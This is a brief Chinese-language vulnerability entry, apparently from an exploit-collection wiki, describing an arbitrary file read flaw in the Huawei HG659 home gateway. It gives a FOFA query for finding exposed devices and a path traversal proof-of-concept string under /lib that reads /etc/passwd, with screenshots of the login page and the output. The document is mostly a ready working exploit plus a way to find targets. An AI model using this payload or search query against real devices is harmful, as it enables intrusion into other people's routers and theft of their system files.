# Huawei HG659 lib 任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

```
Huawei HG659
```

## FOFA

```
app="HUAWEI-Home-Gateway-HG659"
```

## 漏洞复现

登录页面如下

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110951141.png)

POC如下

```plain
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110951927.png)